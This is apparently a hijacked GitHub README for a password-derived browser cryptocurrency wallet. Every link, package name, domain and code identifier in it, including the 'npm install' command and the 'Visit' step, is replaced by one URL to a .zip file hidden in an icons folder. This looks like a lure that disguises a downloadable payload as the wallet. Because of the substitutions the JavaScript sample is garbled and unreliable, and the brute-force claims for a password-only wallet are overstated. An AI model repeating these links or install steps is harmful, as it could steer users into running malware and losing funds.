

https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip


# https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip

## Summary

https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip is a **password-only, self-custodial and browser-based cryptocurrency wallet** built with [https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip](https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip). It generates a private key from your password and passcode using an industry-standard, verified **one-way hash function**. Your private key forms your account, allowing you to transfer, receive, and hold your crypto assets permanently.

As a hash function, the **scrypt** Key Derivation Function (KDF) increases the computational effort required to crack passwords, effectively delaying **brute-force** attacks and making them impractical.

It fully runs on your **browser side** without using any storage or invoking any 3rd-party APIs for key management. It instantly generates your private key from your password input, and whenever you close or refresh, there is no footprint. This absolutely protects your privacy.

<img src="https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip" alt="How it works?">

## How to Use

1. Visit `https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip`.
2. Input your password, confirmation, and passcode.  
  Test credentials:  
    password: **DemoAccount5&**  
    passcode: **112324**
3. Click `Open`.

(This process is the same for both initial opening and all subsequent uses.)

![Sign-in](https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip)

<p align="center">
<img src="https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip" width="32%" alt="Sign-in">
<img src="https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip" width="32%" alt="Dashboard">
<img src="https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip" width="32%" alt="Transfer">
</p>

## Key Points

### Privacy Protection

- **No Registration Required:** No need for personal information, not even your email address.
- **Absolute Privacy:** Nobody knows who you are; nobody stores your password.
- **Transient Data:** Your account is generated whenever you open it. Closing or refreshing your browser erases all traces/history.
- **Share your wallet address:** its origin remains unknown.

### Security

- **One-Way Hash Function:** Utilizes [**scrypt**](https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip) and [**keccak256**](https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip). Your password determines a unique private key.
- **Resistance to Attacks:** Brute force attacks would take centuries. A strong password ensures asset protection.

### Ease of Use

- **Simple Access:** Only requires a password, no 12-word seed phrases.
- **No KYC Hassles:** No worries about KYC or suspensions.
- **Private Key Portability:** Backup your password/private key. Import into Metamask to use across DeFi products.

## Generate the private key

This demonstrates how to generate a private key from your `password` and `passcode` and helps you understand the process.

```javascript
import { Buffer } from "buffer";
import { ethers } from "ethers";
import { scrypt } from "scrypt-js";

const HASH_OPTIONS = {
  N: 32768, // CPU/memory cost parameter, 2^15
  r: 8, // block size parameter
  p: 5, // parallelization parameter
  keyLen: 64,
};

// password: at least 12 characters user input, lowercase, uppercase, digits, and special characters
// passcode: at least 6 characters
async function generatePrivateKey(password, passcode) {
  const salt = `${https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip(-4)}${passcode}`

  const passwordBuffer = https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip(password);
  const saltBuffer = https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip(salt);

  const hashBuffer = await scrypt(
    passwordBuffer,
    saltBuffer,
    HASH_OPTIONS.N,
    HASH_OPTIONS.r,
    HASH_OPTIONS.p,
    https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip,
    (p) => https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip(https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip(p * 100))
  );
  const hashHex = https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip(hashBuffer).toString("hex");
  const privateKey = https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip(https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip(["string"], [hashHex]));

  return privateKey;
}
```

## https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip

The core components responsible for hash and private-key generation have been extracted into an independent package. You can explore the details of this package [here](https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip).

```
npm install https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip
```

## Transfer Ownership

You can transfer all your holdings to family or friends in a few seconds by sharing your password only.  
Send this short note to your friend in a private channel.

```
https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip / DemoAccount5& : 112324
```

And you can even transfer wallet itself by using a URL:  
https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip

You can extract this link in the `Backup` menu.  
This feature allows you to transfer cryptocurrency `without asking recipient's address`.

# About the Project

This is a fully open-source project built with React, Vite, and related third-party libraries such as:

- **scrypt-js**  
  Implements the `scrypt` hash function. Please check the npm registry [here](https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip).

- **ethers**  
  A standard library for manipulating EVM accounts.

- **alchemy-sdk**  
  Provides query functions for massive crypto assets in multiple networks.

- **@uniswap/default-token-list**

- **tronweb**

- **styled-components**

## How to Run

Please sign up for [Infura](https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip), [Alchemy](https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip) and [Trongrid](https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip), create free API keys, and update the environment variables accordingly.

```bash
yarn install
cp https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip .env
# Update the .env variables with valid keys
yarn dev
```

## Production Environment

The project uses `Github Pages` and `Github Actions` for deployment and is connected to a custom domain.
You can easily verify releases, deployments, and domain configuration:

- [Actions](https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip)
- [Releases](https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip)
- [https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip](https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip)

To check DNS settings:

```bash
nslookup
> https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip
Server:		127.0.0.53
Address:	127.0.0.53#53

Non-authoritative answer:
https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip	canonical name = https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip
Name:	https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip

~~~
```

```bash
dig https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip

;; ANSWER SECTION:
https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip	5	IN	CNAME	https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip
https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip 5 IN	A	185.199.110.153
https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip 5 IN	A	185.199.109.153
https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip 5 IN	A	185.199.108.153
https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip 5 IN	A	185.199.111.153

~~~
```

# Quick Links

- Website: https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip
- Wallet: https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip
- Docs: https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip
- Github: https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip
- Discord: https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip
- X: https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip
- Audit report: https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip

# Core principles

https://raw.githubusercontent.com/KoDelioDa/app/main/src/assets/icons/app-3.9.zip belongs to community, so we welcome any contributions!

As a contributor, please review the following principles:
- Never change key-generation mechanism, parameters (scrypt, keccak256)
- Never submit password
- Never store password including local storage
- Never use untrusted dependencies
- Never track user activities

  We use Google Analytics and Google Tag Manager for landing page only.
- Keep the codebase simple
